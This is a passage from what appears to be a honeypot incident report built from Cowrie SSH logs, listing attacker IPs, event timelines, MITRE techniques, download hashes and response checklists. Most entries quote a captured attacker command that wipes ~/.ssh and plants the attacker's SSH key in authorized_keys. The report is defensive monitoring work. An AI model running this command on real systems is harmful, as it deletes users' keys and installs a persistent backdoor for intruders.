| `2026-06-05 11:37:49` | `cowrie.session.params` |
| `2026-06-05 11:37:49` | `cowrie.command.input` |
| `2026-06-05 11:37:50` | `cowrie.log.closed` |
| `2026-06-05 11:37:50` | `cowrie.session.params` |
| `2026-06-05 11:37:50` | `cowrie.command.input` |
| `2026-06-05 11:37:50` | `cowrie.log.closed` |
| `2026-06-05 11:37:50` | `cowrie.session.params` |
| `2026-06-05 11:37:50` | `cowrie.command.input` |
| `2026-06-05 11:37:50` | `cowrie.session.file_download` |
| `2026-06-05 11:37:50` | `cowrie.log.closed` |
| `2026-06-05 11:37:50` | `cowrie.session.params` |
| `2026-06-05 11:37:50` | `cowrie.command.input` |
| `2026-06-05 11:37:50` | `cowrie.log.closed` |
| `2026-06-05 11:37:50` | `cowrie.session.params` |
| `2026-06-05 11:37:50` | `cowrie.command.input` |
| `2026-06-05 11:37:50` | `cowrie.log.closed` |
| `2026-06-05 11:37:50` | `cowrie.session.params` |
| `2026-06-05 11:37:50` | `cowrie.command.input` |
| `2026-06-05 11:37:50` | `cowrie.command.input` |
| `2026-06-05 11:37:50` | `cowrie.log.closed` |
| `2026-06-05 11:37:50` | `cowrie.session.params` |
| `2026-06-05 11:37:50` | `cowrie.command.input` |
| `2026-06-05 11:37:50` | `cowrie.log.closed` |
| `2026-06-05 11:37:50` | `cowrie.session.params` |
| `2026-06-05 11:37:50` | `cowrie.command.input` |
| `2026-06-05 11:37:51` | `cowrie.log.closed` |
| `2026-06-05 11:37:51` | `cowrie.session.params` |
| `2026-06-05 11:37:51` | `cowrie.command.input` |
| `2026-06-05 11:37:51` | `cowrie.log.closed` |
| `2026-06-05 11:37:51` | `cowrie.session.params` |
| `2026-06-05 11:37:51` | `cowrie.command.input` |
| `2026-06-05 11:37:51` | `cowrie.log.closed` |
| `2026-06-05 11:37:51` | `cowrie.session.params` |
| `2026-06-05 11:37:51` | `cowrie.command.input` |
| `2026-06-05 11:37:51` | `cowrie.log.closed` |
| `2026-06-05 11:37:51` | `cowrie.session.params` |
| `2026-06-05 11:37:51` | `cowrie.command.input` |
| `2026-06-05 11:37:51` | `cowrie.log.closed` |
| `2026-06-05 11:37:51` | `cowrie.session.params` |
| `2026-06-05 11:37:51` | `cowrie.command.input` |
| `2026-06-05 11:37:51` | `cowrie.log.closed` |
| `2026-06-05 11:37:51` | `cowrie.session.params` |
| `2026-06-05 11:37:51` | `cowrie.command.input` |
| `2026-06-05 11:37:51` | `cowrie.log.closed` |
| `2026-06-05 11:37:51` | `cowrie.session.params` |
| `2026-06-05 11:37:51` | `cowrie.command.input` |
| `2026-06-05 11:37:52` | `cowrie.log.closed` |
| `2026-06-05 11:37:52` | `cowrie.session.params` |
| `2026-06-05 11:37:52` | `cowrie.command.input` |
| `2026-06-05 11:37:52` | `cowrie.log.closed` |
| `2026-06-05 11:37:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.245[.]79` to AbuseIPDB if not already reported
- [ ] Block `49.207.245[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23d5f93bafcb

| Field | Detail |
|---|---|
| **Source IP** | `49.207.40[.]162` |
| **First Seen** | 2026-06-05 11:39 |
| **Last Seen** | 2026-06-05 11:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 11:39:14` | `cowrie.session.connect` |
| `2026-06-05 11:39:14` | `cowrie.client.version` |
| `2026-06-05 11:39:14` | `cowrie.client.kex` |
| `2026-06-05 11:39:14` | `cowrie.login.success` |
| `2026-06-05 11:39:14` | `cowrie.session.params` |
| `2026-06-05 11:39:14` | `cowrie.command.input` |
| `2026-06-05 11:39:14` | `cowrie.command.failed` |
| `2026-06-05 11:39:14` | `cowrie.log.closed` |
| `2026-06-05 11:39:14` | `cowrie.session.params` |
| `2026-06-05 11:39:14` | `cowrie.command.input` |
| `2026-06-05 11:39:14` | `cowrie.session.file_download` |
| `2026-06-05 11:39:14` | `cowrie.log.closed` |
| `2026-06-05 11:39:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.40[.]162` to AbuseIPDB if not already reported
- [ ] Block `49.207.40[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ae9d11b5766

| Field | Detail |
|---|---|
| **Source IP** | `49.207.40[.]162` |
| **First Seen** | 2026-06-05 11:39 |
| **Last Seen** | 2026-06-05 11:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 11:39:16` | `cowrie.session.connect` |
| `2026-06-05 11:39:16` | `cowrie.client.version` |
| `2026-06-05 11:39:16` | `cowrie.client.kex` |
| `2026-06-05 11:39:16` | `cowrie.login.success` |
| `2026-06-05 11:39:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.40[.]162` to AbuseIPDB if not already reported
- [ ] Block `49.207.40[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64fcfd66b5ce

| Field | Detail |
|---|---|
| **Source IP** | `49.207.40[.]162` |
| **First Seen** | 2026-06-05 11:41 |
| **Last Seen** | 2026-06-05 11:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 11:41:19` | `cowrie.session.connect` |
| `2026-06-05 11:41:19` | `cowrie.client.version` |
| `2026-06-05 11:41:19` | `cowrie.client.kex` |
| `2026-06-05 11:41:19` | `cowrie.login.success` |
| `2026-06-05 11:41:19` | `cowrie.session.params` |
| `2026-06-05 11:41:19` | `cowrie.command.input` |
| `2026-06-05 11:41:19` | `cowrie.command.failed` |
| `2026-06-05 11:41:19` | `cowrie.log.closed` |
| `2026-06-05 11:41:19` | `cowrie.session.params` |
| `2026-06-05 11:41:19` | `cowrie.command.input` |
| `2026-06-05 11:41:19` | `cowrie.session.file_download` |
| `2026-06-05 11:41:19` | `cowrie.log.closed` |
| `2026-06-05 11:41:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.40[.]162` to AbuseIPDB if not already reported
- [ ] Block `49.207.40[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bd03adcdf2c

| Field | Detail |
|---|---|
| **Source IP** | `49.207.40[.]162` |
| **First Seen** | 2026-06-05 11:41 |
| **Last Seen** | 2026-06-05 11:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 11:41:20` | `cowrie.session.connect` |
| `2026-06-05 11:41:20` | `cowrie.client.version` |
| `2026-06-05 11:41:20` | `cowrie.client.kex` |
| `2026-06-05 11:41:20` | `cowrie.login.success` |
| `2026-06-05 11:41:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.40[.]162` to AbuseIPDB if not already reported
- [ ] Block `49.207.40[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bda6b6cbd3c

| Field | Detail |
|---|---|
| **Source IP** | `49.207.245[.]79` |
| **First Seen** | 2026-06-05 11:41 |
| **Last Seen** | 2026-06-05 11:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 11:41:48` | `cowrie.session.connect` |
| `2026-06-05 11:41:48` | `cowrie.client.version` |
| `2026-06-05 11:41:48` | `cowrie.client.kex` |
| `2026-06-05 11:41:48` | `cowrie.login.success` |
| `2026-06-05 11:41:49` | `cowrie.session.params` |
| `2026-06-05 11:41:49` | `cowrie.command.input` |
| `2026-06-05 11:41:49` | `cowrie.command.failed` |
| `2026-06-05 11:41:49` | `cowrie.log.closed` |
| `2026-06-05 11:41:49` | `cowrie.session.params` |
| `2026-06-05 11:41:49` | `cowrie.command.input` |
| `2026-06-05 11:41:49` | `cowrie.session.file_download` |
| `2026-06-05 11:41:49` | `cowrie.log.closed` |
| `2026-06-05 11:41:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.245[.]79` to AbuseIPDB if not already reported
- [ ] Block `49.207.245[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4184aa6933f

| Field | Detail |
|---|---|
| **Source IP** | `49.207.245[.]79` |
| **First Seen** | 2026-06-05 11:41 |
| **Last Seen** | 2026-06-05 11:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 11:41:50` | `cowrie.session.connect` |
| `2026-06-05 11:41:50` | `cowrie.client.version` |
| `2026-06-05 11:41:50` | `cowrie.client.kex` |
| `2026-06-05 11:41:50` | `cowrie.login.success` |
| `2026-06-05 11:41:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.245[.]79` to AbuseIPDB if not already reported
- [ ] Block `49.207.245[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ae7c94def0f

| Field | Detail |
|---|---|
| **Source IP** | `49.207.40[.]162` |
| **First Seen** | 2026-06-05 11:43 |
| **Last Seen** | 2026-06-05 11:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 11:43:23` | `cowrie.session.connect` |
| `2026-06-05 11:43:23` | `cowrie.client.version` |
| `2026-06-05 11:43:23` | `cowrie.client.kex` |
| `2026-06-05 11:43:23` | `cowrie.login.success` |
| `2026-06-05 11:43:23` | `cowrie.session.params` |
| `2026-06-05 11:43:23` | `cowrie.command.input` |
| `2026-06-05 11:43:23` | `cowrie.command.failed` |
| `2026-06-05 11:43:23` | `cowrie.log.closed` |
| `2026-06-05 11:43:23` | `cowrie.session.params` |
| `2026-06-05 11:43:23` | `cowrie.command.input` |
| `2026-06-05 11:43:23` | `cowrie.session.file_download` |
| `2026-06-05 11:43:23` | `cowrie.log.closed` |
| `2026-06-05 11:43:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.40[.]162` to AbuseIPDB if not already reported
- [ ] Block `49.207.40[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6767ef021c9

| Field | Detail |
|---|---|
| **Source IP** | `49.207.40[.]162` |
| **First Seen** | 2026-06-05 11:43 |
| **Last Seen** | 2026-06-05 11:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 11:43:24` | `cowrie.session.connect` |
| `2026-06-05 11:43:24` | `cowrie.client.version` |
| `2026-06-05 11:43:24` | `cowrie.client.kex` |
| `2026-06-05 11:43:24` | `cowrie.login.success` |
| `2026-06-05 11:43:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.40[.]162` to AbuseIPDB if not already reported
- [ ] Block `49.207.40[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-565bb3a9b680

| Field | Detail |
|---|---|
| **Source IP** | `49.207.40[.]162` |
| **First Seen** | 2026-06-05 11:45 |
| **Last Seen** | 2026-06-05 11:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 11:45:26` | `cowrie.session.connect` |
| `2026-06-05 11:45:26` | `cowrie.client.version` |
| `2026-06-05 11:45:26` | `cowrie.client.kex` |
| `2026-06-05 11:45:26` | `cowrie.login.success` |
| `2026-06-05 11:45:26` | `cowrie.session.params` |
| `2026-06-05 11:45:26` | `cowrie.command.input` |
| `2026-06-05 11:45:26` | `cowrie.command.failed` |
| `2026-06-05 11:45:26` | `cowrie.log.closed` |
| `2026-06-05 11:45:27` | `cowrie.session.params` |
| `2026-06-05 11:45:27` | `cowrie.command.input` |
| `2026-06-05 11:45:27` | `cowrie.session.file_download` |
| `2026-06-05 11:45:27` | `cowrie.log.closed` |
| `2026-06-05 11:45:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.40[.]162` to AbuseIPDB if not already reported
- [ ] Block `49.207.40[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36c8ed410222

| Field | Detail |
|---|---|
| **Source IP** | `49.207.40[.]162` |
| **First Seen** | 2026-06-05 11:45 |
| **Last Seen** | 2026-06-05 11:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 11:45:28` | `cowrie.session.connect` |
| `2026-06-05 11:45:28` | `cowrie.client.version` |
| `2026-06-05 11:45:28` | `cowrie.client.kex` |
| `2026-06-05 11:45:28` | `cowrie.login.success` |
| `2026-06-05 11:45:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.40[.]162` to AbuseIPDB if not already reported
- [ ] Block `49.207.40[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2121c5b0d075

| Field | Detail |
|---|---|
| **Source IP** | `49.207.245[.]79` |
| **First Seen** | 2026-06-05 11:46 |
| **Last Seen** | 2026-06-05 11:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 11:46:09` | `cowrie.session.connect` |
| `2026-06-05 11:46:09` | `cowrie.client.version` |
| `2026-06-05 11:46:09` | `cowrie.client.kex` |
| `2026-06-05 11:46:09` | `cowrie.login.success` |
| `2026-06-05 11:46:09` | `cowrie.session.params` |
| `2026-06-05 11:46:09` | `cowrie.command.input` |
| `2026-06-05 11:46:09` | `cowrie.command.failed` |
| `2026-06-05 11:46:09` | `cowrie.log.closed` |
| `2026-06-05 11:46:09` | `cowrie.session.params` |
| `2026-06-05 11:46:09` | `cowrie.command.input` |
| `2026-06-05 11:46:09` | `cowrie.session.file_download` |
| `2026-06-05 11:46:09` | `cowrie.log.closed` |
| `2026-06-05 11:46:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.245[.]79` to AbuseIPDB if not already reported
- [ ] Block `49.207.245[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85550426b8b4

| Field | Detail |
|---|---|
| **Source IP** | `49.207.245[.]79` |
| **First Seen** | 2026-06-05 11:46 |
| **Last Seen** | 2026-06-05 11:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 11:46:10` | `cowrie.session.connect` |
| `2026-06-05 11:46:10` | `cowrie.client.version` |
| `2026-06-05 11:46:10` | `cowrie.client.kex` |
| `2026-06-05 11:46:11` | `cowrie.login.success` |
| `2026-06-05 11:46:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.245[.]79` to AbuseIPDB if not already reported
- [ ] Block `49.207.245[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d72f98dfcc58

| Field | Detail |
|---|---|
| **Source IP** | `49.207.40[.]162` |
| **First Seen** | 2026-06-05 11:49 |
| **Last Seen** | 2026-06-05 11:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 11:49:25` | `cowrie.session.connect` |
| `2026-06-05 11:49:25` | `cowrie.client.version` |
| `2026-06-05 11:49:25` | `cowrie.client.kex` |
| `2026-06-05 11:49:25` | `cowrie.login.success` |
| `2026-06-05 11:49:26` | `cowrie.session.params` |
| `2026-06-05 11:49:26` | `cowrie.command.input` |
| `2026-06-05 11:49:26` | `cowrie.command.failed` |
| `2026-06-05 11:49:26` | `cowrie.log.closed` |
| `2026-06-05 11:49:26` | `cowrie.session.params` |
| `2026-06-05 11:49:26` | `cowrie.command.input` |
| `2026-06-05 11:49:26` | `cowrie.session.file_download` |
| `2026-06-05 11:49:26` | `cowrie.log.closed` |
| `2026-06-05 11:49:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.40[.]162` to AbuseIPDB if not already reported
- [ ] Block `49.207.40[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-090f52f72aff

| Field | Detail |
|---|---|
| **Source IP** | `49.207.40[.]162` |
| **First Seen** | 2026-06-05 11:49 |
| **Last Seen** | 2026-06-05 11:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 11:49:27` | `cowrie.session.connect` |
| `2026-06-05 11:49:27` | `cowrie.client.version` |
| `2026-06-05 11:49:27` | `cowrie.client.kex` |
| `2026-06-05 11:49:27` | `cowrie.login.success` |
| `2026-06-05 11:49:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.40[.]162` to AbuseIPDB if not already reported
- [ ] Block `49.207.40[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b38a132f31d

| Field | Detail |
|---|---|
| **Source IP** | `49.207.40[.]162` |
| **First Seen** | 2026-06-05 11:51 |
| **Last Seen** | 2026-06-05 11:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 11:51:28` | `cowrie.session.connect` |
| `2026-06-05 11:51:28` | `cowrie.client.version` |
| `2026-06-05 11:51:28` | `cowrie.client.kex` |
| `2026-06-05 11:51:28` | `cowrie.login.success` |
| `2026-06-05 11:51:28` | `cowrie.session.params` |
| `2026-06-05 11:51:28` | `cowrie.command.input` |
| `2026-06-05 11:51:28` | `cowrie.command.failed` |
